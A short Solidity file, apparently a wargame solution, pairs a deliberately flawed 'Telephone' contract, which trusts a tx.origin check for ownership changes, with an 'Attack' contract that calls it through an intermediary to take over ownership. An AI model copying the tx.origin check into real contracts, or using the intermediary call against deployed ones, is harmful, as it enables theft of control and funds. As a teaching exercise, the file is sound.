// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract Attack {

    Telephone public immutable telephone;

    constructor() public {
        telephone = Telephone(0x10d0327Ac442224d3486C9b935f454F14eB6EaeB);
    }

    function claimOwnership(address _owner) public {
        telephone.changeOwner(_owner);
    }
}